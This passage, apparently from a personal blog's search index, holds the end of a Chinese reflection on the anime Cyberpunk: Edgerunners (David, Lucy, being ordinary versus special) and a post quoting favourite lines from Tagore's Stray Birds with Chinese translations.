大卫和他周围的同伴是反抗这个资本世界的人，他从底层来，用尽所有生命去反抗这不讲理又无解的世界。他们是有人性的人，所以讲义气，为同伴出生入死。他们是有人性的人，所以大卫杀死一个无辜的母亲会想到自己的母亲。也正因是有人性的人，所以最终会成为赛博精神病。于是，这样的人注定无法战胜冷血无情的公司，即资本。只要有人性就有弱点，从一开始便注定了失败的命运，何等悲哀！即便如此，他们也过了一段足够精彩的人生。书写了独属于他们的传奇。我想，即便再给他们一次机会，依然会做出这样的选择吧。</font>

<p><img src="/images/Lucy4.png" alt="Lucy"></p>
<h1 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h1><p><font color=MidnightBlue>据说，夜之城没有活着的传奇。我见证了大卫这个传奇人物的短暂一生，我见证了大卫与露西的动人恋情，我见证了赛博朋克的义薄云天，我见证了夜之城吃掉了一个又一个梦想…<br>在没看赛博朋克之前，通过零星的言论，我得知这是一部悲剧。我脑海中一直以为会是女主角露西的死去，可结局却是，两人起初在假月球相会，约好一起去月球，最终只有露西一个人去了真月球。而这样一个传奇，最终也被夜之城所吞噬，活在了传说之中。<br>昨晚的感想<strong>普通与特别</strong>，在赛博朋克里也讨论到了。<br>的确，相比于只装了少数小量级义体的人和曼恩他们，大卫是特别的。可是相较于亚当重锤这样几乎全身义体的人而言，大卫所装的沙德威斯坦只是入门级义体，那么大卫也只能算是普通人，承受不住改造金刚的压力。<br>其实普通与特别，只不过是相对之间，同时标准对于不同的人也是不同的，非常主观。我想每个人总有一点在周围人看来特别的部分吧，如果从里到外都是普通的，这样的人恐怕很少见，那其实也算特别吧。因此<strong>没必要纠结于普通或是特别，做自己就是最好</strong>。<br>在这个赛博朋克的世界里，要么堕落至深渊如尸体随处停放，要么过着安分守己的生活一辈子扫清尘土，要么让生命光辉灿烂在一瞬间达到永恒。或许现实世界也是一样，可在这个世界，对比就异常明显了。我们的世界，未来会这样吗？<strong>是否能见证赛博朋克的到来呢？</strong></font></p>
<p><img src="/images/Lucy2.png" alt="Lucy"></p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>过一两年，等剧情都忘得差不多的时候，把赛博朋克游戏买了吧。想必那时候又有全新的体验了，很有趣，不是吗？</p>
<p><img src="/images/Lucy5.png" alt="Lucy"></p>
]]></content>
      <categories>
        <category>动画</category>
        <category>赛博朋克</category>
      </categories>
      <tags>
        <tag>动画</tag>
      </tags>
  </entry>
  <entry>
    <title>飞鸟集--摘抄</title>
    <url>/2022/11/18/%E9%A3%9E%E9%B8%9F%E9%9B%86_%E6%91%98%E6%8A%84/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近突然想起了泰戈尔的飞鸟集里的一些诗，来了兴致，便又重读了飞鸟集，不由得感叹，诗真美啊。这样的美，大概是永恒吧。</p>
<span id="more"></span>
<h1 id="喜欢的句子"><a href="#喜欢的句子" class="headerlink" title="喜欢的句子"></a>喜欢的句子</h1><ol>
<li>It is the tears of the earth that keep here smiles in bloom.<br>是大地的泪点，使她的微笑保持着青春不谢。</li>
<li>If you shed tears when you miss the sun, you also miss the stars.<br>如果你因失去了太阳而流泪，那么你也将失去群星了。</li>
<li>Her wishful face haunts my dreams like the rain at night.<br>她的热切的脸，如夜雨似的，搅扰着我的梦魂。</li>
<li>Sorrow is hushed into peace in my heart like the evening among the silent trees.<br>忧思在我的心里平静下去，正如暮色降临在寂静的山林中。</li>
<li>Do not seat your love upon a precipice because it is high.<br>不要因为峭壁是高的，便让你的爱情坐在峭壁上。</li>
<li>What you are you do not see, what you see is your shadow.<br>你看不见你自己，你所看见的只是你的影子。</li>
<li>His own mornings are new surprises to God.<br>神自己的清晨，在他自己看来也是新奇的。</li>
</ol>
<p>未完待续…</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>曾经听说，所有的作家最初都想成为诗人。<br>诗人，将“美”用文字记录下来，成为了永恒的“美”。<br>让能够理解这样的“美”的人，去跨时代，跨地域，跨文化与诗人产生灵魂的碰撞！</p>
]]></content>
      <categories>
        <category>摘抄</category>
      </categories>
      <tags>
        <tag>诗</tag>
      </tags>
  </entry>
</search>
